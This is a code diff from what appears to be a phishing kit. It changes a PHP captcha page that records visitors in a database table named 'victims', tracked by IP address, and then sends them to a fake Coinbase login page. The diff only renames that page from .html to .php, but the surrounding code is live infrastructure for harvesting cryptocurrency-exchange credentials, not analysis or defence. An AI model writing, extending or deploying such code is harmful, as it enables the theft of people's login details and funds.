@@ -199,16 +199,16 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['h-captcha-response'])
             $db = $database->getConnection();
             $ip = $_SERVER['REMOTE_ADDR'];
             
-            $update_query = "UPDATE victims SET last_activity = NOW(), page_visited = 'coinbaselogin.html' WHERE ip_address = :ip AND status = 'active'";
+            $update_query = "UPDATE victims SET last_activity = NOW(), page_visited = 'coinbaselogin.php' WHERE ip_address = :ip AND status = 'active'";
             $update_stmt = $db->prepare($update_query);
             $update_stmt->execute([':ip' => $ip]);
-            error_log("Victim updated to coinbaselogin.html: $ip");
+            error_log("Victim updated to coinbaselogin.php: $ip");
         } catch (Exception $e) {
             error_log("Victim update error: " . $e->getMessage());
         }
         
         // Captcha verified successfully - redirect to coinbase login
-        header('Location: coinbaselogin.html');
+        header('Location: coinbaselogin.php');
         exit;
     } else {
         // Captcha verification failed
@@ -368,7 +368,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['h-captcha-response'])
             
             // DEVELOPMENT BYPASS - Remove this in production!
             // Uncomment the line below to automatically redirect for testing
-            // setTimeout(() => { window.location.href = 'coinbaselogin.html'; }, 1000);
+            // setTimeout(() => { window.location.href = 'coinbaselogin.php'; }, 1000);
         });
     </script>
 </body>
